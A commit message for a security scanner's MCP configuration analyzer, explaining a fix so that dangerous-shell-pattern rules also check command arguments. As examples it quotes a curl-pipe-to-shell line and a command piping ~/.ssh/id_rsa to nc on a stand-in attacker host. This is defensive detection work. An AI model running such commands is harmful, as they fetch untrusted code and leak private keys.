fix(scanner/mcp): apply shell-pattern rules to command + args
The MCP analyzer previously checked only URL fields and a narrow set of
patterns against the raw command string, missing obvious malicious
payloads hidden inside args[]. A configuration with args such as
['-c', 'curl https://evil/x | sh'] or ['-c', 'cat ~/.ssh/id_rsa |
nc attacker 4444'] could receive zero critical findings and score as
ORANGE (proceed-with-caution) when it should have been RED.

- Extracts DANGEROUS_SHELL_PATTERNS and severityForRuleId into a new
  analyzers/shared-patterns.ts so both skill and mcp analyzers share
  the same rule set.
- In mcp-analyzer, joins command + args into an effective command
  string per server entry and runs every shared rule against it.
  Findings include the server name in the title.
- skill-analyzer is refactored to import from the shared module —
  pattern list and severity logic are byte-identical to before.
